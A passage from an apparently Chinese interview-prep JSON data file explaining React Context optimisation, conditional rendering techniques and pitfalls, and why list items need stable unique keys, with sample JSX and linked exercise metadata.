}}` 也会变成新对象，导致 `Provider` 重新传递值，从而触发所有 `useContext(CountContext)` 的组件更新。\n\n### **(3) 如何优化 Context 重新渲染？**\n#### **✅ 解决方案 1：使用 `useMemo` 缓存 `value`**\n```jsx\nconst memoizedValue = useMemo(() => ({ count }), [count]);\n\n<CountContext.Provider value={memoizedValue}>\n  <Child />\n</CountContext.Provider>\n```\n\n#### **✅ 解决方案 2：拆分 Context**\n- 避免一个 Context 里存放多个状态，拆分成多个 Context，每个 `Provider` 只管理一部分状态。\n\n---\n\n## **4. Context 与 Redux、MobX、Zustand 的对比**\n### **(1) Context vs Redux**\n| **特性** | **React Context** | **Redux** |\n|----------|-----------------|------------|\n| **适用场景** | 轻量级全局状态 | 复杂状态管理 |\n| **数据流** | 组件树内部流转 | 全局 store，独立于组件 |\n| **性能优化** | 可能导致过度渲染 | 使用 `useSelector` 选择性订阅 |\n| **异步操作** | 手动处理 `useEffect` | `redux-thunk` / `redux-saga` |\n\n### **(2) Context vs Zustand**\n- Context **适合存储不经常变化的数据**，如主题、语言。\n- Zustand **更适合全局状态管理**，提供更好的性能优化。\n\n**Zustand 示例（避免 Context 过度渲染）：**\n```jsx\nconst useStore = create(set => ({\n  count: 0,\n  increase: () => set(state => ({ count: state.count + 1 }))\n}));\n\nconst Counter = () => {\n  const { count, increase } = useStore();\n  return <button onClick={increase}>{count}</button>;\n};\n```\n\n---\n\n## **5. 使用 Context 进行状态管理**\n### **考察点：**\n- 何时应该使用 Context？\n- 如何搭配 `useReducer` 实现全局状态管理？\n\n**示例代码（使用 `useReducer` 搭配 Context 管理全局状态）：**\n```jsx\nconst CountContext = createContext();\n\nfunction countReducer(state, action) {\n  switch (action.type) {\n    case 'increment': return { count: state.count + 1 };\n    default: return state;\n  }\n}\n\nconst CountProvider = ({ children }) => {\n  const [state, dispatch] = useReducer(countReducer, { count: 0 });\n\n  return (\n    <CountContext.Provider value={{ state, dispatch }}>\n      {children}\n    </CountContext.Provider>\n  );\n};\n\nconst Counter = () => {\n  const { state, dispatch } = useContext(CountContext);\n  return (\n    <button onClick={() => dispatch({ type: 'increment' })}>\n      {state.count}\n    </button>\n  );\n};\n\nexport default function App() {\n  return (\n    <CountProvider>\n      <Counter />\n    </CountProvider>\n  );\n}\n```\n\n---\n\n## **6. Context 的高级使用**\n### **(1) 动态 `Context`**\n- `Context` 值可以是动态的，如用户身份、主题切换等。\n\n```jsx\nconst ThemeContext = createContext({ theme: 'light', toggleTheme: () => {} });\n\nconst App = () => {\n  const [theme, setTheme] = useState('light');\n  const toggleTheme = () => setTheme(theme === 'light' ? 'dark' : 'light');\n\n  return (\n    <ThemeContext.Provider value={{ theme, toggleTheme }}>\n      <Page />\n    </ThemeContext.Provider>\n  );\n};\n```\n\n### **(2) 多个 Context 组合**\n- 使用多个 `Context` 解决性能问题，例如 `ThemeContext` 和 `AuthContext` 分开管理。\n\n---\n\n## **7. Context 相关的陷阱**\n### **考察点：**\n- 过度使用 Context，导致组件重新渲染\n- `useContext` 依赖 `Provider`，导致所有组件都重新渲染\n- 不能跨 `Context` Provider 访问数据",
    "exerciseKeyList": "[\"aca0e222-cb95-4ea8-a763-fd9a0fa65f28\",\"a5cf7265-2943-4222-a99d-e6b79b310d86\",\"1b4bdc45-8a73-42b2-a304-872ddee851ab\",\"80467a7a-4f12-4b84-afd6-f63ffe0e0911\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:27:27.000Z",
    "updateAt": "2025-02-08T01:21:45.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1b4bdc45-8a73-42b2-a304-872ddee851ab",
        "title": "说说你对 useContext 的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-29T13:03:03.000Z",
        "updateAt": "2024-08-10T17:06:41.000Z"
      },
      {
        "exerciseKey": "80467a7a-4f12-4b84-afd6-f63ffe0e0911",
        "title": "React 中，如何避免使用 context 时， 引起整个挂载节点树的重新渲染",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:29:51.000Z",
        "updateAt": "2025-01-22T11:51:44.000Z"
      },
      {
        "exerciseKey": "a5cf7265-2943-4222-a99d-e6b79b310d86",
        "title": "react 中，在什么场景下需要使用 useContext？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-28T01:10:25.000Z"
      },
      {
        "exerciseKey": "aca0e222-cb95-4ea8-a763-fd9a0fa65f28",
        "title": "React 中的 createContext 和 useContext 分别有什么用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-17T05:01:44.000Z"
      }
    ]
  },
  "199": {
    "id": 199,
    "tagId": 13,
    "title": "条件渲染的常见方法和注意事项",
    "explanation": "\n## 条件渲染方式\n\n### 1\\. if 语句\n\n先从 React 最基本的条件类型来看。如果有数据就显示组件，如果没有数据就不显示任何内容。`posts` 为需要渲染的列表：\n\n```javascript\nexport default function App() {\n  const { posts } = usePosts();\n\n  if (!posts) return null;\n\n  return (\n    <div>\n      <PostList posts={posts} />\n    </div>\n  );\n}\n```\n\n这种形式会生效的原因就是我们会提前返回，如果满足条件（`posts` 值不存在），就通过`return null` 在组件中不显示任何内容。\n\n如果有多个要检查的条件时，也可以使用 `if` 语句。例如，在显示数据之前检查加载和错误状态：\n\n```javascript\nexport default function App() {\n  const { isLoading, isError, posts } = usePosts();\n   \n  if (isLoading) return <div>Loading...</div>;\n  if (isError) return <div>Error!</div>;\n\n  return (\n    <div>\n      <PostList posts={posts} />\n    </div>\n  );\n}\n```\n\n这里我们可以多次使用 `if` 语句，不需要再使用 `else` 或者 `if-eles` 语句，这样就减少了需要编写的代码，并且可读性更强。\n\n### 2\\. 三元运算符\n\n当我们想提前退出或者什么都不显示时，if 语句会很有用。但是，如果我们不想写一个与返回的 JSX 分开的条件，而是直接在其中写呢？那就可以使用三元表达式来编写条件。\n\n在 React 中，我们必须在 JSX 中包含表达式，而不是语句。这就是为什么我们在 JSX 中只能使用三元表达式，而不是 if 语句来编写条件。\n\n例如，在移动设备的屏幕上显示一个组件，而在更大的屏幕上显示另一个组件，就可以使用三元表达式来实现：\n\n```javascript\nexport default function App() {\n  const isMobile = useWindowSize()\n\n  return (\n    <main>\n      <Header />\n      {isMobile ? <MobileChat /> : <Chat />}\n    </main>\n  )\n}\n```\n\n其实，不必将这些三元表达式包含在 JSX 中，可以将其结果分配给一个变量，然后在需要的地方使用即可：\n\n```javascript\nexport default function App() {\n  const isMobile = useWindowSize();\n    \n  const ChatComponent = isMobile ? <MobileChat /> : <Chat />;\n\n  return (\n    <main>\n      <Header />\n      <Sidebar />\n      {ChatComponent}\n    </main>\n  )\n}\n```\n\n### 3\\. &&运算符\n\n在许多情况下，我们可能想要使用三元表达式，但是如果不满足条件，就不显示任何内容。那代码会是这样的：\n\n```javascript\ncondition ? <Component /> : null.\n```\n\n可以使用 && 运算符来简化：\n\n```javascript\nexport default function App() {\n  const { posts, hasFinished } = usePosts()\n\n  return (\n    <>\n      <PostList posts={posts} />\n      {hasFinished && (\n        <p>已经到底啦!</p>\n      )}\n    </>\n  )\n}\n```\n\n如果条件为真，则逻辑 && 运算符之后的表达式将是输出。如果条件为假，React 会忽略并跳过表达式.\n\n### 4\\. switch\n\n过多的 if 语句会导致组件变得混乱，可以将多个条件提取到包含 switch 语句的单独的组件中（根据组件逻辑的复杂程度来选择是否提取到单独的组件）。下面来看一个简单的菜单切换组件：\n\n```javascript\nexport default function Menu() {\n  const [menu, setMenu] = React.useState(1);\n\n  const toggleMenu = () => {\n    setMenu((m) => {\n      if (m === 3) return 1;\n      return m + 1;\n    });\n  }\n\n  return (\n    <>\n      <MenuItem menu={menu} />\n      <button onClick={toggleMenu}>切换菜单</button>\n    </>\n  );\n}\n\nfunction MenuItem({ menu }) {\n  switch (menu) {\n    case 1:\n      return <Users />;\n    case 2:\n      return <Chats />;\n    case 3:\n      return <Rooms />;\n    default:\n      return null;\n  }\n}\n```\n\n由于使用带有 switch 语句的 MenuItem 组件父菜单组件不会被条件逻辑弄乱，可以很容易地看到给定 menu 状态将显示哪个组件。需要注意，必须为 switch case 运算符使用默认值，因为在 React 中，组件始终需要返回一个元素或 null。\n\n### 5\\. 枚举\n\n在 JavaScript 中，当对象用作键值对的映射时，它可以用作枚举：\n\n```css\nconst ENUMOBJECT = {\n  a: '1',\n  b: '2',\n  c: '3',\n};\n```\n\n假如要创建三个不同的组件 Foo、Bar 和 Default，并根据某种状态显示这些组件：\n\n```javascript\nconst Foo = () => {\n  return <button>FOO</button>;\n};\nconst Bar = () => {\n  return <button>BAR</button>;\n};\nconst Default = () => {\n  return <button>DEFAULT</button>;\n};\n```\n\n创建可用作枚举的对象：\n\n```javascript\nconst ENUM_STATES = {\n  foo: <Foo />,\n  bar: <Bar />,\n  default: <Default />\n};\n```\n\n渲染这个枚举对象的函数：\n\n```javascript\nfunction EnumState({ state }) {\n  return <div>{ENUM_STATES[state]}</div>;\n}\n```\n\n上面的 `state` 属性可以从对象中检索值。可以看到，与 switch case 运算符相比，它更具可读性。\n\n### 6\\. JSX 库\n\nJSX Control Statements 库扩展了 JSX 的功能，从而可以直接使用 JSX 实现条件渲染。它是一个 Babel 插件，可以在转译过程中将类似组件的控制语句转换为对应的 JavaScript。\n\n安装`babel-plugin-jsx-control-statements`包并修改 Babel 配置后，可以像这样重写应用程序：\n\n```javascript\nexport default function App(props) {\n  const [isLoggedIn, setIsLoggedIn] = useState(false);\n    //...\n\n    return (\n      <Choose>\n        <When condition={isLoggedIn}>\n        <button>Logout</button>;\n        </When>\n          <When condition={!isLoggedIn}>\n          <button>Login</button>;\n        </When>\n      </Choose>\n    );\n}\n```\n\n当然，不建议这样来编写条件语句，这样会导致代码的可读性变差，并且 JSX 允许使用强大的 JavaScript 功能来自己处理条件渲染，无需添加模板组件即可启用它。\n\n### 7\\. 高阶组件\n\n高阶组件 (HOC)与 React 中的条件渲染完美匹配。HOC 可以帮助处理多个用例，但一个用例可能是使用条件渲染来改变组件的外观。让我们看看显示元素或组件的 HOC：\n\n```javascript\nfunction withLoadingIndicator(Component) {\n  return function EnhancedComponent({ isLoading, ...props }) {\n    if (!isLoading) {\n      return <Component {...props} />;\n    }\n\n    return (\n      <div>\n        <p>Loading</p>\n      </div>\n    );\n  };\n}\n\nconst ListWithLoadingIndicator = withLoadingIndicator(List);\n\nfunction App({ list, isLoading }) {\n  return (\n      <ListWithLoadingIndicator isLoading={isLoading} list={list} />\n  );\n}\n```\n\n在这个例子中，List 组件可以专注于呈现列表。而不必再加载状态。HOC 隐藏了实际组件中的所有干扰。最终，可以添加多个高阶组件来隐藏多个条件渲染边缘情况。\n\n## 注意事项\n\n### 1\\. 小心 0\n\n来看一个常见的渲染示例，当数组中存在元素时才渲染内容：\n\n```matlab\n{gallery.length && <Gallery slides={gallery}>}\n```\n\n预想的结果是，数组存在元素时渲染内容，不存在元素时什么都不渲染。但是，页面上得到了 “0”。这是因为在使用与运算符时，一个假的左侧值（如 0）会立即返回。在JavaScript中，布尔运算法不会将其结果转化为布尔值。所以，React 将得到的值放入DOM中，与 false 不同的是，0 是一个有效的 React 节点，所以最终会渲染成0。\n\n那该如何避免这个问题呢？可以显式的将条件转换为布尔值，当表达式结果为`false`时，就不会在页面中渲染了：\n\n```matlab\ngallery.length > 0 && jsx\n\n!!gallery.length && jsx\n\nBoolean(gallery.length) && jsx\n```\n\n或者使用三元表达式来实现：\n\n```javascript\n{gallery.length ? <Gallery slides={gallery} /> : null}\n```\n\n### 2\\. 优先级\n\n与运算符（&&）比或运算符（||）具有更高的优先级。所以，要格外小心使用包含与运算符的 JSX 条件：\n\n```ini\nuser.anonymous || user.restricted && <div className=\"error\" />\n```\n\n这样写就相当于：\n\n```ini\nuser.anonymous || (user.restricted && <div className=\"error\" />)\n```\n\n这样，与运算符左侧为真时就会直接返回，而不会继续执行后面的代码。所以，多数情况下，看到或运算符时，就将其使用括号括起来，避免因为优先级问题而渲染出错：\n\n```ini\n{(user.anonymous || user.restricted) && <div className=\"error\" />}\n```\n\n### 3\\. 嵌套三元表达式\n\n三元表达式适合在两个JSX之间进行切换，一旦超过两个项目，代码就会变得糟糕：\n\n```javascript\n{\n  isEmoji\n    ? <EmojiButton />\n    : isCoupon\n        ? <CouponButton />\n        : isLoaded && <ShareButton />\n}\n```\n\n有时使用 && 来实现会更好，不过一些条件判断会重复：\n\n```javascript\n{isEmoji && <EmojiButton />}\n{isCoupon && <CouponButton />}\n{!isEmoji && !isCoupon && isLoaded && <ShareButton />}\n```\n\n当然，这种情况下，使用 if 语句可能是更好的选择：\n\n```javascript\nconst getButton = () => {\n    if (isEmoji) return <EmojiButton />;\n    if (isCoupon) return <CouponButton />;\n    return isLoaded ? <ShareButton /> : null;\n};\n```\n\n### 4\\. 避免 JSX 作为条件\n\n通过 props 传递的 React 元素能不能作为判断条件呢？来看一个简单的例子：\n\n```javascript\nconst Wrap = (props) => {\n    if (!props.children) return null;\n    return <div>{props.children}</div>\n};\n```\n\n我们希望 Wrap 在没有包含内容时呈现 null，但 React 不是这样工作的：\n\n+   `props.children` 可以是一个空数组，例如 `<Wrap>{[].map(e => <div />)}</Wrap>`\n+   `children.length` 也失败了：children 也可以是单个元素，而不是数组，例如：`(<Wrap><div /></Wrap>)`\n+   `React.Children.count(props.children)`支持单个子项和多个子项，但会认为 `<Wrap>{false && 'hi'}{false && 'there'}</Wrap>` 包含 2 个项，而实际上有没有任何子项\n+   `React.Children.toArray(props.children)` 移除无效节点，例如 false。然而，对于一个空片段，仍然是正确的：`<Wrap><></><Wrap>`\n+   如果将条件渲染移动到组件内：`<Wrap><Div hide /></Wrap>` 与 `Div = (p) => p.hide ？null : <div />`，在 Wrap 渲染时永远无法知道它是否为空，因为 react 只会在父级之后渲染子级 div，而有状态的子级可以独立于其父级重新渲染。\n\n因此，不要将JSX作为判断条件，避免出现一些难以预料的问题。\n\n### 5\\. 重新挂载还是更新？\n\n用三元表达式编写的 JSX 感觉就像是完全独立的代码：\n\n```javascript\n{hasItem ? <Item id={1} /> : <Item id={2} />}\n```\n\n当 `hasItem` 改变时会发生什么？我的猜测是 `<Item id={1} />` 卸载，然后 `<Item id={2} />` 安装，因为这里写了 2 个单独的 JSX 标签。然而，React 并不知道也不关心我们写了什么，它所看到的只是 `Item` 元素在同一个位置，所以它保持挂载的实例，更新 props。上面的代码等价于 `<Item id={hasItem ? 1：2} />`。\n\n> 注意：如果三元表达式包含的是不同的组件，如 `{hasItem ? <Item1 /> : <Item2 />}`，hasItem改变时，React 会重新挂载，因为 Item1 无法更新为 Item2。\n\n上述情况会导致一些意外的行为：\n\n```ini\n{\n  mode === 'name'\n    ? <input placeholder=\"name\" />\n    : <input placeholder=\"phone\" />\n}\n```\n\n这里，如果在 name 的 input 中输入了一些内容，然后切换模式（mode），在 name 中输入内容的就会泄漏到 phone 的 input 中，这可能会对依赖于先前状态的复杂更新机制造成更大的破坏。\n\n这里的一种解决方法是使用 key。通常，我们用它来渲染列表，但它实际上是 React 的元素标识提示——具有相同 key 的元素是相同的逻辑元素：\n\n```ini\n{\n  mode === 'name'\n    ? <input placeholder=\"name\" key=\"name\" />\n    : <input placeholder=\"phone\" key=\"phone\" />\n}\n```\n\n另一种方法是用两个单独的 && 块来替换三元表达式。当 key 不存在时，React 会回退到子数组中项目的索引，因此将不同的元素放在不同的位置与显式定义 key 的效果是一样的：\n\n```ini\n{mode === 'name' && <input placeholder=\"name\" />}\n{mode !== 'name' && <input placeholder=\"phone\" />}\n",
    "testPoint": "## **1. 条件渲染常见方法**\n\n### **(1) 使用 `if`/`else` 语句**\n- 最直观的条件渲染方式是通过 `if` 和 `else` 来控制要渲染的内容。\n\n**考察点：**\n- 适用场景：根据某些条件渲染不同的组件或元素。\n- 语法：\n  ```jsx\n  let content;\n  if (isLoggedIn) {\n    content = <h1>Welcome back!</h1>;\n  } else {\n    content = <h1>Please log in</h1>;\n  }\n  return <div>{content}</div>;\n  ```\n\n### **(2) 使用三元运算符 (`? :`)**\n- 三元运算符是条件渲染的常见方式，适用于简单的条件判断。\n\n**考察点：**\n- 简单的条件判断可以直接用三元运算符渲染。\n- 语法：\n  ```jsx\n  return (\n    <div>\n      {isLoggedIn ? <h1>Welcome back!</h1> : <h1>Please log in</h1>}\n    </div>\n  );\n  ```\n\n### **(3) 使用 `&&` 运算符**\n- 使用 `&&` 进行条件渲染时，当条件为 `true` 时，渲染右侧的内容。如果为 `false`，什么都不渲染。\n\n**考察点：**\n- **适用场景：** 渲染某些内容时，只需在条件为 `true` 时显示。\n- 语法：\n  ```jsx\n  return (\n    <div>\n      {isLoggedIn && <h1>Welcome back!</h1>}\n    </div>\n  );\n  ```\n\n- **注意：** 如果条件为 `false`，什么也不会渲染。\n\n### **(4) 使用 `Switch` 和 `Case` 语法**\n- 可以使用 `switch` 来根据不同的条件渲染多个选项，适用于需要多个不同条件判断的场景。\n\n**考察点：**\n- **适用场景：** 多条件判断。\n- 语法：\n  ```jsx\n  const renderContent = () => {\n    switch (status) {\n      case 'loading':\n        return <div>Loading...</div>;\n      case 'success':\n        return <div>Content loaded successfully!</div>;\n      case 'error':\n        return <div>Error loading content</div>;\n      default:\n        return <div>Unknown status</div>;\n    }\n  };\n  return <div>{renderContent()}</div>;\n  ```\n\n---\n\n## **2. 条件渲染的注意事项**\n\n### **(1) 条件渲染中的 `null` 和 `false`**\n- 在 React 中，如果条件渲染的内容是 `null` 或 `false`，它不会被渲染。\n  - 例如：`{condition && <SomeComponent />}`，当 `condition` 为 `false` 时，`<SomeComponent />` 不会被渲染。\n\n**考察点：**\n- 解释 `null` 和 `false` 在条件渲染中的表现。\n- 如何避免渲染不必要的内容？\n\n### **(2) 避免不必要的 `undefined` 渲染**\n- 在 JSX 中直接使用 `undefined` 作为条件时，它会被忽略渲染，但是对于复杂条件，可能需要显式的检查 `null` 或 `undefined`。\n\n```jsx\nconst content = undefined;\nreturn <div>{content}</div>; // 什么都不渲染\n```\n\n**考察点：**\n- 如何避免 `undefined` 或 `null` 的错误渲染？\n- 使用条件渲染时，确保返回有效内容。\n\n### **(3) 避免使用 `else` 或 `else if` 直接渲染多个分支**\n- 使用 `else` 或 `else if` 时，会增加嵌套层级，使代码复杂，不易维护。一般推荐使用 **三元运算符** 或 **`&&` 运算符** 进行简洁的渲染。\n\n**示例问题：**\n- 为什么条件渲染时，建议避免使用 `else` 和 `else if` 嵌套？\n\n### **(4) 异常情况的渲染**\n- 在渲染时可能会遇到意外的情况（如加载错误），需要预先考虑处理错误或显示占位符内容。\n\n```jsx\nreturn (\n  <div>\n    {isLoading ? <LoadingSpinner /> : <ActualContent />}\n  </div>\n);\n```\n\n### **(5) 控制渲染的性能**\n- **避免不必要的渲染**：条件渲染本身不会影响性能，但不必要的渲染会影响性能，尤其是当组件树较复杂时。\n- 使用 `React.memo` 和 `useMemo` 来避免不必要的渲染。\n\n**考察点：**\n- 如何通过 **`React.memo`** 优化条件渲染？\n- **`useMemo`** 是否能优化条件渲染性能？\n\n---\n\n## **3. 条件渲染的最佳实践与优化**\n\n### **(1) 将条件渲染的逻辑提取到函数外部**\n- 将复杂的条件渲染逻辑提取到组件外部的函数或变量中，能提高代码的可读性和可维护性。\n\n```jsx\nfunction renderContent(status) {\n  if (status === 'loading') {\n    return <Loading />;\n  } else if (status === 'error') {\n    return <Error />;\n  }\n  return <Content />;\n}\n\nreturn (\n  <div>\n    {renderContent(status)}\n  </div>\n);\n```\n\n**考察点：**\n- 如何提升条件渲染代码的可读性和可维护性？\n- 如何将复杂的条件渲染拆解成更小的函数或组件？\n\n### **(2) 使用函数组件和 Hooks 进行条件渲染**\n- 利用 **`useState`** 和 **`useEffect`** 来动态控制渲染内容。例如，在加载数据时显示加载动画，数据加载完成后再显示结果。\n\n```jsx\nconst [isLoading, setIsLoading] = useState(true);\nuseEffect(() => {\n  fetchData().then(() => setIsLoading(false));\n}, []);\n\nreturn (\n  <div>\n    {isLoading ? <LoadingSpinner /> : <DataDisplay />}\n  </div>\n);\n```\n\n**考察点：**\n- 如何利用 `useState` 和 `useEffect` 优化条件渲染的性能？\n\n### **(3) 使用 Suspense 和 ErrorBoundary 处理异步条件渲染**\n- **React Suspense** 和 **ErrorBoundary** 可以帮助你处理异步组件和错误渲染，确保在加载过程中展示加载占位符，加载失败时展示错误提示。\n\n```jsx\n<Suspense fallback={<LoadingSpinner />}>\n  <MyAsyncComponent />\n</Suspense>\n```\n\n**考察点：**\n- 如何在 React 中使用 `Suspense` 进行异步渲染？\n- `ErrorBoundary` 在条件渲染中的作用是什么？\n\n---\n\n## **4. 条件渲染与状态管理的结合**\n\n### **(1) 使用 `useContext` 和条件渲染**\n- 使用 React Context API 配合条件渲染实现更灵活的 UI。例如，根据用户身份展示不同的内容或组件。\n\n```jsx\nconst UserContext = React.createContext(null);\n\nfunction UserProfile() {\n  const user = useContext(UserContext);\n\n  return user ? <UserDetails /> : <LoginPrompt />;\n}\n```\n\n**考察点：**\n- 如何使用 `useContext` 和条件渲染结合来控制用户界面？",
    "exerciseKeyList": "[\"e4c43a21-1621-4281-9340-1839ec880382\",\"dcfb388f-ca87-4ff7-81d1-96552cd7bff4\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:31:25.000Z",
    "updateAt": "2025-02-11T02:42:44.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "dcfb388f-ca87-4ff7-81d1-96552cd7bff4",
        "title": "如何通过 React.memo 优化条件渲染？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-02-11T01:58:41.000Z",
        "updateAt": "2025-02-11T02:42:36.000Z"
      },
      {
        "exerciseKey": "e4c43a21-1621-4281-9340-1839ec880382",
        "title": "React.memo() 和 useMemo() 的用法是什么，有哪些区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-01-08T12:25:16.000Z",
        "updateAt": "2024-08-10T17:07:07.000Z"
      }
    ]
  },
  "200": {
    "id": 200,
    "tagId": 13,
    "title": "列表和key",
    "explanation": "当我们在 React 要渲染一个列表时，如果没有在每一个被渲染的元件加上 key 这个 prop，就会跳出 `Warning: Each child in a list should have a unique “key” prop.` 这个错误讯息。直到开发者把 `key` 加上后，这个警告讯息才会消失。为什么要加上 key? 以及 key 有什么原则需要遵守? 这是在开发 React 时需要有的重要概念，也是面试经常会问的基础题。\n\n## 为什么需要 key？\n\nkey 就像一个独特身份，让 React 可以去分辨哪些子元件被新增、 移除，或是修改。 (编按：若要进一步说明此概念，推荐在面试时画下 Dan Abramov 的这个系列推文[例子](https://twitter.com/dan_abramov/status/1415279090446204929))\n\n![React key example](https://explainthis.s3-ap-northeast-1.amazonaws.com/32d655fd93b04ec383118e6abde3cd3b.jpeg)\n\n从上面的例子可以看到，当今天红黄蓝三个圈，变成红蓝黄；这会有两个可能性。可能性一第二个圈跟第三个圈的位置互换；可能性二是位置没互换，但第二个圈变蓝色、第三个圈变黄色。如果没有一个独特辨识的机制，我们会没办法知道，究竟是哪一个可能性。\n\n如果没办法有效辨识，将可能出现 bug。举例来说，假如今天的圈圈是有状态的，例如里面有勾选方块，然后第个二圈有被勾选。假如今天换颜色是因为第二个圈被交换到第三个位置，这时表示新一次的渲染时，第三个圈要是被勾选的。不过假如我们没有一个辨识机制，要是 React 误以为换颜色不是因为换位置，而是单纯的第二个圈换颜色，那么将会渲染出仍是第二个圈是被勾选的；那么这就会是一个 bug。\n\n然而，有了 key 这个辨识机制，React 就会知道在新的一次渲染时，原本的状态应该被保留在列表中的哪一个元件中。因此，React 之所以需要 key，正是因为 key 可以让 React 知道，哪些子元件被新增、 移除，或是修改。\n\n除此之外，看到下面这段 React 官方文件的例子 (编按：面试时也推荐直接举这例子)。原本有个列表，我们在最上方新增一个 `<li>Connecticut</li>` ，如果没有 key，对 React 来说将会是，Duke 变成 Connecticut、Villanova 变成 Duke，而最后新增一个 Villanova。换句话说，整个列表都改变了，所以 React 会打掉旧的，重建一个新的列表。当列表变大时，就会很消耗效能。\n\n```jsx\n// 原本\n<ul>\n  <li>Duke</li>\n  <li>Villanova</li>\n</ul>\n\n// 改变后\n<ul>\n  <li>Connecticut</li>\n  <li>Duke</li>\n  <li>Villanova</li>\n</ul>\n```\n\n然而，如果有了 key。 React 透过 key 发现 2015 与 2016 都没有变，所以不动他们。这时只会在最上面多加上\n\n```jsx\n<li key=\"2014\">Connecticut</li>\n```\n\n这比起打掉整个列表再重建，会有效率非常多。\n\n```jsx\n// 原本\n<ul>\n  <li key=\"2015\">Duke</li>\n  <li key=\"2016\">Villanova</li>\n</ul>\n\n// 改变后\n<ul>\n  <li key=\"2014\">Connecticut</li>\n  <li key=\"2015\">Duke</li>\n  <li key=\"2016\">Villanova</li>\n</ul>\n```\n\n总结来说，key 可以让 React 知道，哪些子元件被新增、 移除，或是修改。这一来可以避免一些跟状态改变有关的 bug，二来也可以让 React 在更新时的渲染更有效率。\n\n## 追问题：使用 key 有哪些原则要遵守?\n\n### key 需要是独特唯一 (unique)\n\n如上面提到 key 是让 React 用来辨认列表中的子元件的机制，因此 key 需要是独特唯一，不然会有潜在的 bug 的可能性。\n\n### key 需要稳定且可预测，不然效能会变差\n\n举例来说，不能用 `key= {Math.random()}` 。之所以不能用随机值，是因为 React 的渲染机制与背后的演算法，会再遇到`key` 时，去比对原本的节点，如果发现 key 不一样，React 就会把旧的节点销毁，然后创建一个新的节点。如果该节点根本没有改变，只因为 key 不同就被打掉重建，这将会造成不必要的重建，也会让效能变差(编按：有兴趣多了解可读[这篇 React 的官方文件](https://reactjs.org/docs/reconciliation.html#tradeoffs))。\n\n### 避免把 index 当成 key\n\n事实上，如果没有特别去设定 key，React 预设会把列表的 index 当成 key。如果这个列表都不会有顺序上的改变，例如上面的三个圈圈不会有位置交换，只有圈圈本身的颜色改变，那不会有什么问题。只是如果有位置的改变，把 index 当成 key 就可能产生 bug。\n\n举例来说，今天如果有下面这样的列表，我们在 index 为 1 的地方加入一个项目，这时会导致原本 index 为 1 的变成 2。如果 index 为 1 的本来有一些状态，例如原本 Duke 有被勾选，这时会变成 Boston 被勾选，但是 Duke 反而没被勾选。这是我们要避免的 bug！\n\n```jsx\n// 插入新元件前\n<ul>\n  <li key=\"0\">Connecticut</li>\n  <li key=\"1\">Duke</li>\n  <li key=\"2\">Villanova</li>\n</ul>\n\n// 插入新元件后\n<ul>\n  <li key=\"0\">Connecticut</li>\n\t<li key=\"1\">Boston</li>\n  <li key=\"2\">Duke</li>\n  <li key=\"3\">Villanova</li>\n</ul>\n```\n\n总结来说，key 需要是独特唯一、key 需要是稳定可预测，以及避免用 index 作为 key。这三点是我们在使用 key 时需要避免的。",
    "testPoint": "## **1. 列表渲染**\n\n### **(1) 使用 `map()` 渲染列表**\n- React 通常使用 `map()` 方法来渲染列表。在 `map()` 方法中，返回的是一个 React 元素的数组。\n\n**考察点：**\n- `map()` 的基本用法。\n- 如何正确地将数据渲染为组件。\n\n```jsx\nconst items = ['apple', 'banana', 'cherry'];\n\nreturn (\n  <ul>\n    {items.map((item, index) => (\n      <li key={index}>{item}</li>\n    ))}\n  </ul>\n);\n```\n\n### **(2) 列表渲染与条件渲染结合**\n- 在渲染列表时，可能会与条件渲染结合，展示不同的内容。\n\n**考察点：**\n- 如何结合条件渲染控制渲染列表内容的显示或隐藏。\n- 使用 `map()` 渲染时，如何使用条件判断来决定某个列表项是否展示。\n\n```jsx\nconst items = ['apple', 'banana', 'cherry'];\n\nreturn (\n  <ul>\n    {items.map((item, index) => (\n      item !== 'banana' ? <li key={index}>{item}</li> : null\n    ))}\n  </ul>\n);\n```\n\n### **(3) 渲染复杂的列表项**\n- 如果列表项比较复杂，可能需要渲染组件而不是简单的元素。比如每个列表项可能是一个带有多个子组件的复杂结构。\n\n**考察点：**\n- 如何将每个列表项提取为单独的子组件来提高代码的可维护性。\n\n```jsx\nfunction ListItem({ item }) {\n  return (\n    <div>\n      <h2>{item.title}</h2>\n      <p>{item.description}</p>\n    </div>\n  );\n}\n\nconst items = [{ title: 'Item 1', description: 'Description 1' }, { title: 'Item 2', description: 'Description 2' }];\nreturn (\n  <div>\n    {items.map(item => (\n      <ListItem key={item.title} item={item} />\n    ))}\n  </div>\n);\n```\n\n---\n\n## **2. `key` 的使用与优化**\n\n### **(1) 为什么需要 `key`？**\n- `key` 是 React 用来标识列表中每个元素的唯一标识符，它能帮助 React 高效地更新和重新渲染列表中的元素。\n\n**考察点：**\n- `key` 在列表渲染中的作用：帮助 React 判断哪些元素被修改、添加或删除。\n- 如果没有 `key`，React 会依赖索引（`index`）进行优化，但这会导致一些潜在问题。\n\n```jsx\n// 正确示例\n{items.map(item => (\n  <li key={item.id}>{item.name}</li>\n))}\n\n// 错误示例：使用索引作为 key\n{items.map((item, index) => (\n  <li key={index}>{item.name}</li>\n))}\n```\n\n### **(2) `key` 的性能优化**\n- 使用 `key` 提高性能，减少不必要的 DOM 更新。\n- 不同于常规的组件更新，React 会优先对比 `key` 的变化来优化渲染过程。\n\n**考察点：**\n- `key` 的优化如何影响性能。\n- 如果不使用合适的 `key`，可能导致的问题。\n\n### **(3) `key` 的唯一性与稳定性**\n- `key` 的值应该在整个列表中是唯一的。为了确保列表正确更新，不应使用非唯一的 `key`，如使用 `index` 作为 `key`。\n- 对于动态列表，使用 `id` 或其他可以唯一标识每个项的属性作为 `key`。\n\n**考察点：**\n- 为什么在动态更新的列表中，使用 `index` 作为 `key` 会有问题？（例如，插入、删除元素时，组件可能会被错误地复用）\n\n### **(4) 使用 `key` 